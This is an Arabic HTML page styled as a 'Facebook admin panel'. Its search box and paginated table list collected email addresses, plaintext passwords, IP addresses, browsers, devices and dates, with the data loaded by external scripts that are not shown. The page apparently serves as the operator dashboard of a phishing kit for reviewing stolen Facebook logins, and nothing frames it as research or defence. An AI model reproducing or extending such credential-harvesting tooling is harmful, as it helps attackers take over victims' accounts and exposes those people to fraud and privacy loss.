<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة إدارة فيسبوك</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="admin-page">
        <div class="admin-header">
            <div class="admin-logo">لوحة الإدارة</div>
            <button id="logoutButton" class="logout-button">تسجيل الخروج</button>
        </div>
        
        <div class="admin-container">
            <div class="admin-stats">
                <div class="stat-card">
                    <h3>عدد المستخدمين</h3>
                    <p id="totalUsers">0</p>
                </div>
                <div class="stat-card">
                    <h3>آخر تسجيل</h3>
                    <p id="lastLogin">غير متاح</p>
                </div>
            </div>
            
            <div class="admin-table-container">
                <div class="table-header">
                    <h2>بيانات المستخدمين</h2>
                    <div class="search-box">
                        <input type="text" id="searchInput" placeholder="بحث...">
                        <button id="searchButton">بحث</button>
                    </div>
                </div>
                
                <table class="user-data-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>البريد الإلكتروني</th>
                            <th>كلمة المرور</th>
                            <th>IP</th>
                            <th>المتصفح</th>
                            <th>الجهاز</th>
                            <th>التاريخ</th>
                            <th>الإجراءات</th>
                        </tr>
                    </thead>
                    <tbody id="userDataTable">
                        <!-- سيتم ملء الجدول بالبيانات -->
                    </tbody>
                </table>
                
                <div class="table-footer">
                    <div class="pagination">
                        <button id="prevPage">السابق</button>
                        <span id="pageInfo">الصفحة 1 من 1</span>
                        <button id="nextPage">التالي</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="users.js"></script>
    <script src="admin.js"></script>
</body>
</html>
